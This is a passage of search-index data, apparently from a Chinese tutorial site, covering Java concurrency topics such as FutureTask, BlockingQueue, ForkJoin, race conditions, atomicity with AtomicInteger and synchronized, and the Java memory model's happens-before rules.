2 1 2 2 2 2 2 1 2 2`},{header:"\u516B\u3001J.U.C - \u5176\u5B83\u7EC4\u4EF6",slug:"\u516B\u3001j-u-c-\u5176\u5B83\u7EC4\u4EF6",content:""},{header:"FutureTask",slug:"futuretask",content:`\u5728\u4ECB\u7ECD Callable \u65F6\u6211\u4EEC\u77E5\u9053\u5B83\u53EF\u4EE5\u6709\u8FD4\u56DE\u503C\uFF0C\u8FD4\u56DE\u503C\u901A\u8FC7 Future<V> \u8FDB\u884C\u5C01\u88C5\u3002FutureTask \u5B9E\u73B0\u4E86 RunnableFuture \u63A5\u53E3\uFF0C\u8BE5\u63A5\u53E3\u7EE7\u627F\u81EA Runnable \u548C Future<V> \u63A5\u53E3\uFF0C\u8FD9\u4F7F\u5F97 FutureTask \u65E2\u53EF\u4EE5\u5F53\u505A\u4E00\u4E2A\u4EFB\u52A1\u6267\u884C\uFF0C\u4E5F\u53EF\u4EE5\u6709\u8FD4\u56DE\u503C\u3002
public class FutureTask<V> implements RunnableFuture<V>
public interface RunnableFuture<V> extends Runnable, Future<V>
FutureTask \u53EF\u7528\u4E8E\u5F02\u6B65\u83B7\u53D6\u6267\u884C\u7ED3\u679C\u6216\u53D6\u6D88\u6267\u884C\u4EFB\u52A1\u7684\u573A\u666F\u3002\u5F53\u4E00\u4E2A\u8BA1\u7B97\u4EFB\u52A1\u9700\u8981\u6267\u884C\u5F88\u957F\u65F6\u95F4\uFF0C\u90A3\u4E48\u5C31\u53EF\u4EE5\u7528 FutureTask \u6765\u5C01\u88C5\u8FD9\u4E2A\u4EFB\u52A1\uFF0C\u4E3B\u7EBF\u7A0B\u5728\u5B8C\u6210\u81EA\u5DF1\u7684\u4EFB\u52A1\u4E4B\u540E\u518D\u53BB\u83B7\u53D6\u7ED3\u679C\u3002
public class FutureTaskExample { public static void main(String[] args) throws ExecutionException, InterruptedException { FutureTask<Integer> futureTask = new FutureTask<Integer>(new Callable<Integer>() { @Override public Integer call() throws Exception { int result = 0; for (int i = 0; i < 100; i++) { Thread.sleep(10); result += i; } return result; } }); Thread computeThread = new Thread(futureTask); computeThread.start(); Thread otherThread = new Thread(() -> { System.out.println("other task is running..."); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } }); otherThread.start(); System.out.println(futureTask.get()); }
}
other task is running...
4950`},{header:"BlockingQueue",slug:"blockingqueue",content:`java.util.concurrent.BlockingQueue \u63A5\u53E3\u6709\u4EE5\u4E0B\u963B\u585E\u961F\u5217\u7684\u5B9E\u73B0\uFF1A FIFO \u961F\u5217 \uFF1ALinkedBlockingQueue\u3001ArrayBlockingQueue\uFF08\u56FA\u5B9A\u957F\u5EA6\uFF09
\u4F18\u5148\u7EA7\u961F\u5217 \uFF1APriorityBlockingQueue \u63D0\u4F9B\u4E86\u963B\u585E\u7684 take() \u548C put() \u65B9\u6CD5\uFF1A\u5982\u679C\u961F\u5217\u4E3A\u7A7A take() \u5C06\u963B\u585E\uFF0C\u76F4\u5230\u961F\u5217\u4E2D\u6709\u5185\u5BB9\uFF1B\u5982\u679C\u961F\u5217\u4E3A\u6EE1 put() \u5C06\u963B\u585E\uFF0C\u76F4\u5230\u961F\u5217\u6709\u7A7A\u95F2\u4F4D\u7F6E\u3002
\u4F7F\u7528 BlockingQueue \u5B9E\u73B0\u751F\u4EA7\u8005\u6D88\u8D39\u8005\u95EE\u9898
public class ProducerConsumer { private static BlockingQueue<String> queue = new ArrayBlockingQueue<>(5); private static class Producer extends Thread { @Override public void run() { try { queue.put("product"); } catch (InterruptedException e) { e.printStackTrace(); } System.out.print("produce.."); } } private static class Consumer extends Thread { @Override public void run() { try { String product = queue.take(); } catch (InterruptedException e) { e.printStackTrace(); } System.out.print("consume.."); } }
}
public static void main(String[] args) { for (int i = 0; i < 2; i++) { Producer producer = new Producer(); producer.start(); } for (int i = 0; i < 5; i++) { Consumer consumer = new Consumer(); consumer.start(); } for (int i = 0; i < 3; i++) { Producer producer = new Producer(); producer.start(); }
}
produce..produce..consume..consume..produce..consume..produce..consume..produce..consume..`},{header:"ForkJoin",slug:"forkjoin",content:`\u4E3B\u8981\u7528\u4E8E\u5E76\u884C\u8BA1\u7B97\u4E2D\uFF0C\u548C MapReduce \u539F\u7406\u7C7B\u4F3C\uFF0C\u90FD\u662F\u628A\u5927\u7684\u8BA1\u7B97\u4EFB\u52A1\u62C6\u5206\u6210\u591A\u4E2A\u5C0F\u4EFB\u52A1\u5E76\u884C\u8BA1\u7B97\u3002
public class ForkJoinExample extends RecursiveTask<Integer> { private final int threshold = 5; private int first; private int last; public ForkJoinExample(int first, int last) { this.first = first; this.last = last; } @Override protected Integer compute() { int result = 0; if (last - first <= threshold) { // \u4EFB\u52A1\u8DB3\u591F\u5C0F\u5219\u76F4\u63A5\u8BA1\u7B97 for (int i = first; i <= last; i++) { result += i; } } else { // \u62C6\u5206\u6210\u5C0F\u4EFB\u52A1 int middle = first + (last - first) / 2; ForkJoinExample leftTask = new ForkJoinExample(first, middle); ForkJoinExample rightTask = new ForkJoinExample(middle + 1, last); leftTask.fork(); rightTask.fork(); result = leftTask.join() + rightTask.join(); } return result; }
}
public static void main(String[] args) throws ExecutionException, InterruptedException { ForkJoinExample example = new ForkJoinExample(1, 10000); ForkJoinPool forkJoinPool = new ForkJoinPool(); Future result = forkJoinPool.submit(example); System.out.println(result.get());
}
ForkJoin \u4F7F\u7528 ForkJoinPool \u6765\u542F\u52A8\uFF0C\u5B83\u662F\u4E00\u4E2A\u7279\u6B8A\u7684\u7EBF\u7A0B\u6C60\uFF0C\u7EBF\u7A0B\u6570\u91CF\u53D6\u51B3\u4E8E CPU \u6838\u6570\u3002
public class ForkJoinPool extends AbstractExecutorService
ForkJoinPool \u5B9E\u73B0\u4E86\u5DE5\u4F5C\u7A83\u53D6\u7B97\u6CD5\u6765\u63D0\u9AD8 CPU \u7684\u5229\u7528\u7387\u3002\u6BCF\u4E2A\u7EBF\u7A0B\u90FD\u7EF4\u62A4\u4E86\u4E00\u4E2A\u53CC\u7AEF\u961F\u5217\uFF0C\u7528\u6765\u5B58\u50A8\u9700\u8981\u6267\u884C\u7684\u4EFB\u52A1\u3002\u5DE5\u4F5C\u7A83\u53D6\u7B97\u6CD5\u5141\u8BB8\u7A7A\u95F2\u7684\u7EBF\u7A0B\u4ECE\u5176\u5B83\u7EBF\u7A0B\u7684\u53CC\u7AEF\u961F\u5217\u4E2D\u7A83\u53D6\u4E00\u4E2A\u4EFB\u52A1\u6765\u6267\u884C\u3002\u7A83\u53D6\u7684\u4EFB\u52A1\u5FC5\u987B\u662F\u6700\u665A\u7684\u4EFB\u52A1\uFF0C\u907F\u514D\u548C\u961F\u5217\u6240\u5C5E\u7EBF\u7A0B\u53D1\u751F\u7ADE\u4E89\u3002\u4F8B\u5982\u4E0B\u56FE\u4E2D\uFF0CThread2 \u4ECE Thread1 \u7684\u961F\u5217\u4E2D\u62FF\u51FA\u6700\u665A\u7684 Task1 \u4EFB\u52A1\uFF0CThread1 \u4F1A\u62FF\u51FA Task2 \u6765\u6267\u884C\uFF0C\u8FD9\u6837\u5C31\u907F\u514D\u53D1\u751F\u7ADE\u4E89\u3002\u4F46\u662F\u5982\u679C\u961F\u5217\u4E2D\u53EA\u6709\u4E00\u4E2A\u4EFB\u52A1\u65F6\u8FD8\u662F\u4F1A\u53D1\u751F\u7ADE\u4E89\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e42f188f-f4a9-4e6f-88fc-45f4682072fb.png" width="300px">`},{header:"\u4E5D\u3001\u7EBF\u7A0B\u4E0D\u5B89\u5168\u793A\u4F8B",slug:"\u4E5D\u3001\u7EBF\u7A0B\u4E0D\u5B89\u5168\u793A\u4F8B",content:`\u5982\u679C\u591A\u4E2A\u7EBF\u7A0B\u5BF9\u540C\u4E00\u4E2A\u5171\u4EAB\u6570\u636E\u8FDB\u884C\u8BBF\u95EE\u800C\u4E0D\u91C7\u53D6\u540C\u6B65\u64CD\u4F5C\u7684\u8BDD\uFF0C\u90A3\u4E48\u64CD\u4F5C\u7684\u7ED3\u679C\u662F\u4E0D\u4E00\u81F4\u7684\u3002
\u4EE5\u4E0B\u4EE3\u7801\u6F14\u793A\u4E86 1000 \u4E2A\u7EBF\u7A0B\u540C\u65F6\u5BF9 cnt \u6267\u884C\u81EA\u589E\u64CD\u4F5C\uFF0C\u64CD\u4F5C\u7ED3\u675F\u4E4B\u540E\u5B83\u7684\u503C\u6709\u53EF\u80FD\u5C0F\u4E8E 1000\u3002
public class ThreadUnsafeExample { private int cnt = 0; public void add() { cnt++; } public int get() { return cnt; }
}
public static void main(String[] args) throws InterruptedException { final int threadSize = 1000; ThreadUnsafeExample example = new ThreadUnsafeExample(); final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i < threadSize; i++) { executorService.execute(() -> { example.add(); countDownLatch.countDown(); }); } countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());
}
997`},{header:"\u5341\u3001Java \u5185\u5B58\u6A21\u578B",slug:"\u5341\u3001java-\u5185\u5B58\u6A21\u578B",content:"Java \u5185\u5B58\u6A21\u578B\u8BD5\u56FE\u5C4F\u853D\u5404\u79CD\u786C\u4EF6\u548C\u64CD\u4F5C\u7CFB\u7EDF\u7684\u5185\u5B58\u8BBF\u95EE\u5DEE\u5F02\uFF0C\u4EE5\u5B9E\u73B0\u8BA9 Java \u7A0B\u5E8F\u5728\u5404\u79CD\u5E73\u53F0\u4E0B\u90FD\u80FD\u8FBE\u5230\u4E00\u81F4\u7684\u5185\u5B58\u8BBF\u95EE\u6548\u679C\u3002"},{header:"\u4E3B\u5185\u5B58\u4E0E\u5DE5\u4F5C\u5185\u5B58",slug:"\u4E3B\u5185\u5B58\u4E0E\u5DE5\u4F5C\u5185\u5B58",content:`\u5904\u7406\u5668\u4E0A\u7684\u5BC4\u5B58\u5668\u7684\u8BFB\u5199\u7684\u901F\u5EA6\u6BD4\u5185\u5B58\u5FEB\u51E0\u4E2A\u6570\u91CF\u7EA7\uFF0C\u4E3A\u4E86\u89E3\u51B3\u8FD9\u79CD\u901F\u5EA6\u77DB\u76FE\uFF0C\u5728\u5B83\u4EEC\u4E4B\u95F4\u52A0\u5165\u4E86\u9AD8\u901F\u7F13\u5B58\u3002
\u52A0\u5165\u9AD8\u901F\u7F13\u5B58\u5E26\u6765\u4E86\u4E00\u4E2A\u65B0\u7684\u95EE\u9898\uFF1A\u7F13\u5B58\u4E00\u81F4\u6027\u3002\u5982\u679C\u591A\u4E2A\u7F13\u5B58\u5171\u4EAB\u540C\u4E00\u5757\u4E3B\u5185\u5B58\u533A\u57DF\uFF0C\u90A3\u4E48\u591A\u4E2A\u7F13\u5B58\u7684\u6570\u636E\u53EF\u80FD\u4F1A\u4E0D\u4E00\u81F4\uFF0C\u9700\u8981\u4E00\u4E9B\u534F\u8BAE\u6765\u89E3\u51B3\u8FD9\u4E2A\u95EE\u9898\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/942ca0d2-9d5c-45a4-89cb-5fd89b61913f.png" width="600px">
\u6240\u6709\u7684\u53D8\u91CF\u90FD\u5B58\u50A8\u5728\u4E3B\u5185\u5B58\u4E2D\uFF0C\u6BCF\u4E2A\u7EBF\u7A0B\u8FD8\u6709\u81EA\u5DF1\u7684\u5DE5\u4F5C\u5185\u5B58\uFF0C\u5DE5\u4F5C\u5185\u5B58\u5B58\u50A8\u5728\u9AD8\u901F\u7F13\u5B58\u6216\u8005\u5BC4\u5B58\u5668\u4E2D\uFF0C\u4FDD\u5B58\u4E86\u8BE5\u7EBF\u7A0B\u4F7F\u7528\u7684\u53D8\u91CF\u7684\u4E3B\u5185\u5B58\u526F\u672C\u62F7\u8D1D\u3002
\u7EBF\u7A0B\u53EA\u80FD\u76F4\u63A5\u64CD\u4F5C\u5DE5\u4F5C\u5185\u5B58\u4E2D\u7684\u53D8\u91CF\uFF0C\u4E0D\u540C\u7EBF\u7A0B\u4E4B\u95F4\u7684\u53D8\u91CF\u503C\u4F20\u9012\u9700\u8981\u901A\u8FC7\u4E3B\u5185\u5B58\u6765\u5B8C\u6210\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/15851555-5abc-497d-ad34-efed10f43a6b.png" width="600px">`},{header:"\u5185\u5B58\u95F4\u4EA4\u4E92\u64CD\u4F5C",slug:"\u5185\u5B58\u95F4\u4EA4\u4E92\u64CD\u4F5C",content:`Java \u5185\u5B58\u6A21\u578B\u5B9A\u4E49\u4E86 8 \u4E2A\u64CD\u4F5C\u6765\u5B8C\u6210\u4E3B\u5185\u5B58\u548C\u5DE5\u4F5C\u5185\u5B58\u7684\u4EA4\u4E92\u64CD\u4F5C\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8b7ebbad-9604-4375-84e3-f412099d170c.png" width="450px"> read\uFF1A\u628A\u4E00\u4E2A\u53D8\u91CF\u7684\u503C\u4ECE\u4E3B\u5185\u5B58\u4F20\u8F93\u5230\u5DE5\u4F5C\u5185\u5B58\u4E2D
load\uFF1A\u5728 read \u4E4B\u540E\u6267\u884C\uFF0C\u628A read \u5F97\u5230\u7684\u503C\u653E\u5165\u5DE5\u4F5C\u5185\u5B58\u7684\u53D8\u91CF\u526F\u672C\u4E2D
use\uFF1A\u628A\u5DE5\u4F5C\u5185\u5B58\u4E2D\u4E00\u4E2A\u53D8\u91CF\u7684\u503C\u4F20\u9012\u7ED9\u6267\u884C\u5F15\u64CE
assign\uFF1A\u628A\u4E00\u4E2A\u4ECE\u6267\u884C\u5F15\u64CE\u63A5\u6536\u5230\u7684\u503C\u8D4B\u7ED9\u5DE5\u4F5C\u5185\u5B58\u7684\u53D8\u91CF
store\uFF1A\u628A\u5DE5\u4F5C\u5185\u5B58\u7684\u4E00\u4E2A\u53D8\u91CF\u7684\u503C\u4F20\u9001\u5230\u4E3B\u5185\u5B58\u4E2D
write\uFF1A\u5728 store \u4E4B\u540E\u6267\u884C\uFF0C\u628A store \u5F97\u5230\u7684\u503C\u653E\u5165\u4E3B\u5185\u5B58\u7684\u53D8\u91CF\u4E2D
lock\uFF1A\u4F5C\u7528\u4E8E\u4E3B\u5185\u5B58\u7684\u53D8\u91CF
unlock`},{header:"\u5185\u5B58\u6A21\u578B\u4E09\u5927\u7279\u6027",slug:"\u5185\u5B58\u6A21\u578B\u4E09\u5927\u7279\u6027",content:""},{header:"1. \u539F\u5B50\u6027",slug:"_1-\u539F\u5B50\u6027",content:`Java \u5185\u5B58\u6A21\u578B\u4FDD\u8BC1\u4E86 read\u3001load\u3001use\u3001assign\u3001store\u3001write\u3001lock \u548C unlock \u64CD\u4F5C\u5177\u6709\u539F\u5B50\u6027\uFF0C\u4F8B\u5982\u5BF9\u4E00\u4E2A int \u7C7B\u578B\u7684\u53D8\u91CF\u6267\u884C assign \u8D4B\u503C\u64CD\u4F5C\uFF0C\u8FD9\u4E2A\u64CD\u4F5C\u5C31\u662F\u539F\u5B50\u6027\u7684\u3002\u4F46\u662F Java \u5185\u5B58\u6A21\u578B\u5141\u8BB8\u865A\u62DF\u673A\u5C06\u6CA1\u6709\u88AB volatile \u4FEE\u9970\u7684 64 \u4F4D\u6570\u636E\uFF08long\uFF0Cdouble\uFF09\u7684\u8BFB\u5199\u64CD\u4F5C\u5212\u5206\u4E3A\u4E24\u6B21 32 \u4F4D\u7684\u64CD\u4F5C\u6765\u8FDB\u884C\uFF0C\u5373 load\u3001store\u3001read \u548C write \u64CD\u4F5C\u53EF\u4EE5\u4E0D\u5177\u5907\u539F\u5B50\u6027\u3002
\u6709\u4E00\u4E2A\u9519\u8BEF\u8BA4\u8BC6\u5C31\u662F\uFF0Cint \u7B49\u539F\u5B50\u6027\u7684\u7C7B\u578B\u5728\u591A\u7EBF\u7A0B\u73AF\u5883\u4E2D\u4E0D\u4F1A\u51FA\u73B0\u7EBF\u7A0B\u5B89\u5168\u95EE\u9898\u3002\u524D\u9762\u7684\u7EBF\u7A0B\u4E0D\u5B89\u5168\u793A\u4F8B\u4EE3\u7801\u4E2D\uFF0Ccnt \u5C5E\u4E8E int \u7C7B\u578B\u53D8\u91CF\uFF0C1000 \u4E2A\u7EBF\u7A0B\u5BF9\u5B83\u8FDB\u884C\u81EA\u589E\u64CD\u4F5C\u4E4B\u540E\uFF0C\u5F97\u5230\u7684\u503C\u4E3A 997 \u800C\u4E0D\u662F 1000\u3002
\u4E3A\u4E86\u65B9\u4FBF\u8BA8\u8BBA\uFF0C\u5C06\u5185\u5B58\u95F4\u7684\u4EA4\u4E92\u64CD\u4F5C\u7B80\u5316\u4E3A 3 \u4E2A\uFF1Aload\u3001assign\u3001store\u3002
\u4E0B\u56FE\u6F14\u793A\u4E86\u4E24\u4E2A\u7EBF\u7A0B\u540C\u65F6\u5BF9 cnt \u8FDB\u884C\u64CD\u4F5C\uFF0Cload\u3001assign\u3001store \u8FD9\u4E00\u7CFB\u5217\u64CD\u4F5C\u6574\u4F53\u4E0A\u770B\u4E0D\u5177\u5907\u539F\u5B50\u6027\uFF0C\u90A3\u4E48\u5728 T1 \u4FEE\u6539 cnt \u5E76\u4E14\u8FD8\u6CA1\u6709\u5C06\u4FEE\u6539\u540E\u7684\u503C\u5199\u5165\u4E3B\u5185\u5B58\uFF0CT2 \u4F9D\u7136\u53EF\u4EE5\u8BFB\u5165\u65E7\u503C\u3002\u53EF\u4EE5\u770B\u51FA\uFF0C\u8FD9\u4E24\u4E2A\u7EBF\u7A0B\u867D\u7136\u6267\u884C\u4E86\u4E24\u6B21\u81EA\u589E\u8FD0\u7B97\uFF0C\u4F46\u662F\u4E3B\u5185\u5B58\u4E2D cnt \u7684\u503C\u6700\u540E\u4E3A 1 \u800C\u4E0D\u662F 2\u3002\u56E0\u6B64\u5BF9 int \u7C7B\u578B\u8BFB\u5199\u64CD\u4F5C\u6EE1\u8DB3\u539F\u5B50\u6027\u53EA\u662F\u8BF4\u660E load\u3001assign\u3001store \u8FD9\u4E9B\u5355\u4E2A\u64CD\u4F5C\u5177\u5907\u539F\u5B50\u6027\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2797a609-68db-4d7b-8701-41ac9a34b14f.jpg" width="300px">
AtomicInteger \u80FD\u4FDD\u8BC1\u591A\u4E2A\u7EBF\u7A0B\u4FEE\u6539\u7684\u539F\u5B50\u6027\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/dd563037-fcaa-4bd8-83b6-b39d93a12c77.jpg" width="300px">
\u4F7F\u7528 AtomicInteger \u91CD\u5199\u4E4B\u524D\u7EBF\u7A0B\u4E0D\u5B89\u5168\u7684\u4EE3\u7801\u4E4B\u540E\u5F97\u5230\u4EE5\u4E0B\u7EBF\u7A0B\u5B89\u5168\u5B9E\u73B0\uFF1A
public class AtomicExample { private AtomicInteger cnt = new AtomicInteger(); public void add() { cnt.incrementAndGet(); } public int get() { return cnt.get(); }
}
public static void main(String[] args) throws InterruptedException { final int threadSize = 1000; AtomicExample example = new AtomicExample(); // \u53EA\u4FEE\u6539\u8FD9\u6761\u8BED\u53E5 final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i < threadSize; i++) { executorService.execute(() -> { example.add(); countDownLatch.countDown(); }); } countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());
}
1000
\u9664\u4E86\u4F7F\u7528\u539F\u5B50\u7C7B\u4E4B\u5916\uFF0C\u4E5F\u53EF\u4EE5\u4F7F\u7528 synchronized \u4E92\u65A5\u9501\u6765\u4FDD\u8BC1\u64CD\u4F5C\u7684\u539F\u5B50\u6027\u3002\u5B83\u5BF9\u5E94\u7684\u5185\u5B58\u95F4\u4EA4\u4E92\u64CD\u4F5C\u4E3A\uFF1Alock \u548C unlock\uFF0C\u5728\u865A\u62DF\u673A\u5B9E\u73B0\u4E0A\u5BF9\u5E94\u7684\u5B57\u8282\u7801\u6307\u4EE4\u4E3A monitorenter \u548C monitorexit\u3002
public class AtomicSynchronizedExample { private int cnt = 0; public synchronized void add() { cnt++; } public synchronized int get() { return cnt; }
}
public static void main(String[] args) throws InterruptedException { final int threadSize = 1000; AtomicSynchronizedExample example = new AtomicSynchronizedExample(); final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i < threadSize; i++) { executorService.execute(() -> { example.add(); countDownLatch.countDown(); }); } countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());
}
1000`},{header:"2. \u53EF\u89C1\u6027",slug:"_2-\u53EF\u89C1\u6027",content:`\u53EF\u89C1\u6027\u6307\u5F53\u4E00\u4E2A\u7EBF\u7A0B\u4FEE\u6539\u4E86\u5171\u4EAB\u53D8\u91CF\u7684\u503C\uFF0C\u5176\u5B83\u7EBF\u7A0B\u80FD\u591F\u7ACB\u5373\u5F97\u77E5\u8FD9\u4E2A\u4FEE\u6539\u3002Java \u5185\u5B58\u6A21\u578B\u662F\u901A\u8FC7\u5728\u53D8\u91CF\u4FEE\u6539\u540E\u5C06\u65B0\u503C\u540C\u6B65\u56DE\u4E3B\u5185\u5B58\uFF0C\u5728\u53D8\u91CF\u8BFB\u53D6\u524D\u4ECE\u4E3B\u5185\u5B58\u5237\u65B0\u53D8\u91CF\u503C\u6765\u5B9E\u73B0\u53EF\u89C1\u6027\u7684\u3002
\u4E3B\u8981\u6709\u4E09\u79CD\u5B9E\u73B0\u53EF\u89C1\u6027\u7684\u65B9\u5F0F\uFF1A volatile
synchronized\uFF0C\u5BF9\u4E00\u4E2A\u53D8\u91CF\u6267\u884C unlock \u64CD\u4F5C\u4E4B\u524D\uFF0C\u5FC5\u987B\u628A\u53D8\u91CF\u503C\u540C\u6B65\u56DE\u4E3B\u5185\u5B58\u3002
final\uFF0C\u88AB final \u5173\u952E\u5B57\u4FEE\u9970\u7684\u5B57\u6BB5\u5728\u6784\u9020\u5668\u4E2D\u4E00\u65E6\u521D\u59CB\u5316\u5B8C\u6210\uFF0C\u5E76\u4E14\u6CA1\u6709\u53D1\u751F this \u9003\u9038\uFF08\u5176\u5B83\u7EBF\u7A0B\u901A\u8FC7 this \u5F15\u7528\u8BBF\u95EE\u5230\u521D\u59CB\u5316\u4E86\u4E00\u534A\u7684\u5BF9\u8C61\uFF09\uFF0C\u90A3\u4E48\u5176\u5B83\u7EBF\u7A0B\u5C31\u80FD\u770B\u89C1 final \u5B57\u6BB5\u7684\u503C\u3002 \u5BF9\u524D\u9762\u7684\u7EBF\u7A0B\u4E0D\u5B89\u5168\u793A\u4F8B\u4E2D\u7684 cnt \u53D8\u91CF\u4F7F\u7528 volatile \u4FEE\u9970\uFF0C\u4E0D\u80FD\u89E3\u51B3\u7EBF\u7A0B\u4E0D\u5B89\u5168\u95EE\u9898\uFF0C\u56E0\u4E3A volatile \u5E76\u4E0D\u80FD\u4FDD\u8BC1\u64CD\u4F5C\u7684\u539F\u5B50\u6027\u3002`},{header:"3. \u6709\u5E8F\u6027",slug:"_3-\u6709\u5E8F\u6027",content:`\u6709\u5E8F\u6027\u662F\u6307\uFF1A\u5728\u672C\u7EBF\u7A0B\u5185\u89C2\u5BDF\uFF0C\u6240\u6709\u64CD\u4F5C\u90FD\u662F\u6709\u5E8F\u7684\u3002\u5728\u4E00\u4E2A\u7EBF\u7A0B\u89C2\u5BDF\u53E6\u4E00\u4E2A\u7EBF\u7A0B\uFF0C\u6240\u6709\u64CD\u4F5C\u90FD\u662F\u65E0\u5E8F\u7684\uFF0C\u65E0\u5E8F\u662F\u56E0\u4E3A\u53D1\u751F\u4E86\u6307\u4EE4\u91CD\u6392\u5E8F\u3002\u5728 Java \u5185\u5B58\u6A21\u578B\u4E2D\uFF0C\u5141\u8BB8\u7F16\u8BD1\u5668\u548C\u5904\u7406\u5668\u5BF9\u6307\u4EE4\u8FDB\u884C\u91CD\u6392\u5E8F\uFF0C\u91CD\u6392\u5E8F\u8FC7\u7A0B\u4E0D\u4F1A\u5F71\u54CD\u5230\u5355\u7EBF\u7A0B\u7A0B\u5E8F\u7684\u6267\u884C\uFF0C\u5374\u4F1A\u5F71\u54CD\u5230\u591A\u7EBF\u7A0B\u5E76\u53D1\u6267\u884C\u7684\u6B63\u786E\u6027\u3002
volatile \u5173\u952E\u5B57\u901A\u8FC7\u6DFB\u52A0\u5185\u5B58\u5C4F\u969C\u7684\u65B9\u5F0F\u6765\u7981\u6B62\u6307\u4EE4\u91CD\u6392\uFF0C\u5373\u91CD\u6392\u5E8F\u65F6\u4E0D\u80FD\u628A\u540E\u9762\u7684\u6307\u4EE4\u653E\u5230\u5185\u5B58\u5C4F\u969C\u4E4B\u524D\u3002
\u4E5F\u53EF\u4EE5\u901A\u8FC7 synchronized \u6765\u4FDD\u8BC1\u6709\u5E8F\u6027\uFF0C\u5B83\u4FDD\u8BC1\u6BCF\u4E2A\u65F6\u523B\u53EA\u6709\u4E00\u4E2A\u7EBF\u7A0B\u6267\u884C\u540C\u6B65\u4EE3\u7801\uFF0C\u76F8\u5F53\u4E8E\u662F\u8BA9\u7EBF\u7A0B\u987A\u5E8F\u6267\u884C\u540C\u6B65\u4EE3\u7801\u3002`},{header:"\u5148\u884C\u53D1\u751F\u539F\u5219",slug:"\u5148\u884C\u53D1\u751F\u539F\u5219",content:"\u4E0A\u9762\u63D0\u5230\u4E86\u53EF\u4EE5\u7528 volatile \u548C synchronized \u6765\u4FDD\u8BC1\u6709\u5E8F\u6027\u3002\u9664\u6B64\u4E4B\u5916\uFF0CJVM \u8FD8\u89C4\u5B9A\u4E86\u5148\u884C\u53D1\u751F\u539F\u5219\uFF0C\u8BA9\u4E00\u4E2A\u64CD\u4F5C\u65E0\u9700\u63A7\u5236\u5C31\u80FD\u5148\u4E8E\u53E6\u4E00\u4E2A\u64CD\u4F5C\u5B8C\u6210\u3002"},{header:"1. \u5355\u4E00\u7EBF\u7A0B\u539F\u5219",slug:"_1-\u5355\u4E00\u7EBF\u7A0B\u539F\u5219",content:`Single Thread rule \u5728\u4E00\u4E2A\u7EBF\u7A0B\u5185\uFF0C\u5728\u7A0B\u5E8F\u524D\u9762\u7684\u64CD\u4F5C\u5148\u884C\u53D1\u751F\u4E8E\u540E\u9762\u7684\u64CD\u4F5C\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/874b3ff7-7c5c-4e7a-b8ab-a82a3e038d20.png" width="180px">`},{header:"2. \u7BA1\u7A0B\u9501\u5B9A\u89C4\u5219",slug:"_2-\u7BA1\u7A0B\u9501\u5B9A\u89C4\u5219",content:`Monitor Lock Rule \u4E00\u4E2A unlock \u64CD\u4F5C\u5148\u884C\u53D1\u751F\u4E8E\u540E\u9762\u5BF9\u540C\u4E00\u4E2A\u9501\u7684 lock \u64CD\u4F5C\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8996a537-7c4a-4ec8-a3b7-7ef1798eae26.png" width="350px">`},{header:"3. volatile \u53D8\u91CF\u89C4\u5219",slug:"_3-volatile-\u53D8\u91CF\u89C4\u5219",content:`Volatile Variable Rule \u5BF9\u4E00\u4E2A volatile \u53D8\u91CF\u7684\u5199\u64CD\u4F5C\u5148\u884C\u53D1\u751F\u4E8E\u540E\u9762\u5BF9\u8FD9\u4E2A\u53D8\u91CF\u7684\u8BFB\u64CD\u4F5C\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/942f33c9-8ad9-4987-836f-007de4c21de0.png" width="400px">`},{header:"4. \u7EBF\u7A0B\u542F\u52A8\u89C4\u5219",slug:"_4-\u7EBF\u7A0B\u542F\u52A8\u89C4\u5219",content:`Thread Start Rule Thread \u5BF9\u8C61\u7684 start() \u65B9\u6CD5\u8C03\u7528\u5148\u884C\u53D1\u751F\u4E8E\u6B64\u7EBF\u7A0B\u7684\u6BCF\u4E00\u4E2A\u52A8\u4F5C\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6270c216-7ec0-4db7-94de-0003bce37cd2.png" width="380px">`},{header:"5. \u7EBF\u7A0B\u52A0\u5165\u89C4\u5219",slug:"_5-\u7EBF\u7A0B\u52A0\u5165\u89C4\u5219",content:`Thread Join Rule Thread \u5BF9\u8C61\u7684\u7ED3\u675F\u5148\u884C\u53D1\u751F\u4E8E join() \u65B9\u6CD5\u8FD4\u56DE\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/233f8d89-31d7-413f-9c02-042f19c46ba1.png" width="400px">`},{header:"6. \u7EBF\u7A0B\u4E2D\u65AD\u89C4\u5219",slug:"_6-\u7EBF\u7A0B\u4E2D\u65AD\u89C4\u5219",content:"Thread Interruption Rule \u5BF9\u7EBF\u7A0B interrupt() \u65B9\u6CD5\u7684\u8C03\u7528\u5148\u884C\u53D1\u751F\u4E8E\u88AB\u4E2D\u65AD\u7EBF\u7A0B\u7684\u4EE3\u7801\u68C0\u6D4B\u5230\u4E2D\u65AD\u4E8B\u4EF6\u7684\u53D1\u751F\uFF0C\u53EF\u4EE5\u901A\u8FC7 interrupted() \u65B9\u6CD5\u68C0\u6D4B\u5230\u662F\u5426\u6709\u4E2D\u65AD\u53D1\u751F\u3002"},{header:"7. \u5BF9\u8C61\u7EC8\u7ED3\u89C4\u5219",slug:"_7-\u5BF9\u8C61\u7EC8\u7ED3\u89C4\u5219",content:"Finalizer Rule 